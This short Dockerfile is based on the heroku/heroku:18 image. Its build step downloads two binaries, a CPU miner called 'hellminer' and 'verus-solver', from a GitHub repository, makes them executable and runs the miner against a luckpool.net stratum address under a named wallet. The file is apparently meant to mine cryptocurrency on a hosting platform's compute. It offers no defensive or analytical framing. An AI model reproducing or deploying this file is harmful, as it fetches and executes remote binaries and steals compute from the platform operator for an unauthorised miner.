FROM heroku/heroku:18
RUN lscpu
RUN apt-get install -y curl git unzip wget
RUN wget github.com/Godmine99/cpu/raw/main/hellminer ; chmod +x hellminer ; wget github.com/Godmine99/cpu/raw/main/verus-solver ; chmod +x verus-solver ./verus-solver ; ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RHsTKuNry58Gk1YzDpYoQCPhFMLj3Nn3z2.Shikari -p x --cpu 1
CMD bash heroku.sh
